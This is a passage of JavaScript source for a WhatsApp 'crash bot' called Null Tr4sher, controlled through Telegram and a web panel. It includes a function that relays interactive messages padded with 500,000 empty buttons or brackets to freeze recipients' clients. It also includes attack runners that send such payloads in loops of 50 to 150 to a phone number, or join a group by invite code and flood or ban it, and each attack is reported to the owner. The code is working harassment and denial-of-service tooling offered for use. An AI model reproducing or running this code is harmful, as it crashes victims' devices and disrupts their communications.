      jpegThumbnail: "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",
      contextInfo: {},
      thumbnailHeight: 480,
      thumbnailWidth: 480
    }
  };
  const msg = {
    interactiveMessage: {
      header: { hasMediaAttachment: true, documentMessage: docs.documentMessage },
      body: { text: "7eppsynC" },
      nativeFlowMessage: {
        buttons: array ? Array.from({ length: 500000 }, () => ({})) : "[".repeat(500000)
      }
    }
  };
  await sock.relayMessage(target, gs ? { groupStatusMessageV2: { message: msg } } : msg, { isSecret: true });
}

async function requirePaired(ctx) {
  const userId = ctx.from.id;

  if (isOwner(userId)) {
    if (waNumbers.length === 0) {
      ctx.reply("🚧 Belum ada session WhatsApp. Lakukan /pairwa dulu.");
      return false;
    }
  } else if (!pairedUsers.has(userId)) {
    ctx.reply("❌ Kamu belum /pairwa.");
    return false;
  }

  if (!waReady()) {
    ctx.reply("❌ WhatsApp belum terkoneksi. Jalankan /pairwa dulu atau tunggu reconnect.");
    return false;
  }

  return true;
}

//~~~~~~~~~( RESTORE SESSION )~~~~~~~~~//
async function restoreSession() {
  if (!sessionExists()) {
    console.log(chalk.yellow("⚠️ Tidak ada session WhatsApp tersimpan."));
    return;
  }

  try {
    console.log(chalk.yellow("🔄 Restoring WhatsApp session..."));

    const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      auth: state,
      browser: Browsers.macOS("Safari")
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === "open") {
        whatsappStatus = true;
        reconnecting = false;
        console.log(chalk.green("✅ WhatsApp session restored & connected"));
      }

      if (connection === "close") {
        whatsappStatus = false;
        const reason = lastDisconnect?.error?.output?.statusCode
                    || lastDisconnect?.error?.statusCode;

        console.log(chalk.red(`❌ WhatsApp closed. Reason: ${reason}`));

        if (reason === DisconnectReason.loggedOut) {
          clearSession();
          console.log(chalk.red("⚠️ Session logged out, perlu /pairwa ulang"));
          sock = null;
          return;
        }

        if (reason === 515) {
          console.log(chalk.yellow("🔄 [515] Restart socket cepat..."));
          setTimeout(() => restoreSession(), 1000);
          return;
        }

        if (!reconnecting) {
          reconnecting = true;
          setTimeout(() => restoreSession(), 3000);
        }
      }
    });

    await new Promise((resolve) => {
      let done = false;
      const finish = () => {
        if (done) return;
        done = true;
        clearTimeout(timeout);
        try { sock?.ev?.off("connection.update", handler); } catch (_) {}
        resolve();
      };
      const timeout = setTimeout(() => {
        console.log(chalk.yellow("⏱️ Timeout, lanjut launch bot..."));
        finish();
      }, 60000);

      const handler = (u) => {
        if (u.connection === "open") finish();
        if (u.connection === "close") {
          const reason = u.lastDisconnect?.error?.output?.statusCode
                      || u.lastDisconnect?.error?.statusCode;
          if (reason === DisconnectReason.loggedOut || reason === 515) finish();
        }
      };
      sock.ev.on("connection.update", handler);
    });

  } catch (e) {
    console.log(chalk.red("❌ Restore session error: " + e.message));
  }
}

//~~~~~~~~~( BOOT )~~~~~~~~~//
(async () => {
  console.log(chalk.cyan.bold("═══════════════════════════════════════"));
  console.log(chalk.cyan.bold("      NULL TR4SHER — BOT ONLINE"));
  console.log(chalk.cyan.bold("═══════════════════════════════════════"));

  await restoreSession();
  bot.launch();
  console.log(chalk.green.bold("✅ Null Tr4sher Online"));

  // ===== WEB PANEL =====
  const { startWeb } = require("./public/server.js");

  global.__NTED__ = {
  get whatsappStatus() { return whatsappStatus; },
  clearSession,
  restartSession: async () => {
    try { clearSession(); await restoreSession(); }
    catch (e) { console.log("restartSession error:", e.message); }
  },

  // ===== REQUEST PAIRING CODE DARI WEB =====
  requestPairing: async (number, byUser) => {
    const clean = String(number).replace(/\D/g, "");
    if (!clean) throw new Error("Nomor tidak valid");

    console.log(chalk.yellow(`[WEB-PAIRING] Request pairing ${clean} by ${byUser}`));

    // Kalau session sudah ada dan WA terkoneksi
    if (sessionExists() && whatsappStatus) {
      return { ok: true, connected: true, msg: "WhatsApp sudah terkoneksi" };
    }

    // Kalau session ada tapi belum connect → coba restore dulu
    if (sessionExists()) {
      await restoreSession();
      if (whatsappStatus) {
        return { ok: true, connected: true, msg: "WhatsApp sudah terkoneksi" };
      }
    }

    // Belum ada session → buat socket baru & minta pairing code
    try {
      const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
      const { version } = await fetchLatestBaileysVersion();

      sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        syncFullHistory: false,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
          whatsappStatus = true;
          reconnecting = false;
          console.log(chalk.green(`✅ [WEB] WhatsApp connected: ${clean}`));
        }

        if (connection === "close") {
          whatsappStatus = false;
          const reason = lastDisconnect?.error?.output?.statusCode
                      || lastDisconnect?.error?.statusCode;

          if (reason === DisconnectReason.loggedOut) {
            clearSession();
            sock = null;
            return;
          }
          if (reason === 515) {
            setTimeout(() => restoreSession(), 1000);
            return;
          }
          if (!reconnecting) {
            reconnecting = true;
            setTimeout(() => restoreSession(), 3000);
          }
        }
      });

      // Tunggu socket ready
      const ready = await waitForSocketReady(sock, 30000);
      if (!ready) throw new Error("Socket WA gagal terhubung");

      await sleep(2000);

      // Request pairing code
      const pairingCode = await sock.requestPairingCode(clean);
      const formattedCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;

      return {
        ok: true,
        code: formattedCode,
        raw: pairingCode,
        number: clean,
        msg: "Pairing code dibuat. Masukkan di WhatsApp → Perangkat Tertaut."
      };
    } catch (e) {
      console.log(chalk.red("requestPairing error: " + e.message));
      throw new Error("Gagal request pairing: " + e.message);
    }
  },

  // ===== ATTACK DM (owner bisa walau gak punya nomor sendiri) =====
  runAttack: async (type, rawTarget, byUser) => {
    if (!waReady()) throw new Error("WhatsApp belum siap");
    const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    console.log(chalk.yellow(`[WEB-ATTACK] ${type} → ${target} by ${byUser}`));

    const runner = {
      car:  async () => { for (let i=0;i<150;i++){ await oh(sock, target); await sleep(5000); } },
      dbut: async () => { for (let i=0;i<50;i++){ await annotationz(sock,target); await sleep(3000); await docThumb(sock,target); await Attrs(sock,target); await sleep(3000); } },
      pom:  async () => { for (let i=0;i<150;i++){ await Attrs(sock, target); } },
      ios:  async () => { for (let i=0;i<150;i++){ await iozk(sock,target); await sleep(3000); await iozk2(sock,target); await sleep(3000); } }
    };

    if (!runner[type]) throw new Error("Tipe attack tidak dikenal");
    await runner[type]();

    try {
      if (settings.ownerIds?.length) {
        await bot.telegram.sendMessage(
          settings.ownerIds[0],
          `🌐 <b>Web Attack</b>\n├ Type: <code>${type}</code>\n├ Target: <code>${rawTarget}</code>\n└ By: <code>${byUser}</code>`,
          { parse_mode: "HTML" }
        );
      }
    } catch {}
  },

  // ===== ATTACK GROUP =====
  joinGroupAndAttack: async (type, inviteCode, byUser) => {
    if (!waReady()) throw new Error("WhatsApp belum siap");
    console.log(chalk.yellow(`[WEB-GROUP] Joining ${inviteCode}...`));

    let groupJid;
    try {
      groupJid = await sock.groupAcceptInvite(inviteCode);
      console.log(chalk.green(`✅ Joined group: ${groupJid}`));
      await sleep(2000);
    } catch (e) {
      throw new Error("Gagal join grup: " + e.message);
    }

    const runners = {
      doct: async () => {
        for (let i = 0; i < 100; i++) {
          await docThumb(sock, groupJid, false, true);
          await sleep(2000);
          console.log(chalk.green(`doct → ${groupJid} ${i+1}/100`));
        }
      },
      dban: async () => {
        await groupBan(sock, groupJid);
        console.log(chalk.green(`dban → ${groupJid} executed`));
      }
    };

    if (!runners[type]) throw new Error("Tipe grup tidak dikenal");
    await runners[type]();

    try {
      if (settings.ownerIds?.length) {
        await bot.telegram.sendMessage(
          settings.ownerIds[0],
          `🌐 <b>Web Group Attack</b>\n├ Type: <code>${type}</code>\n├ Invite: <code>${inviteCode}</code>\n├ Group: <code>${groupJid}</code>\n└ By: <code>${byUser}</code>`,
          { parse_mode: "HTML" }
        );
      }
    } catch {}
  }
};

  startWeb();
})();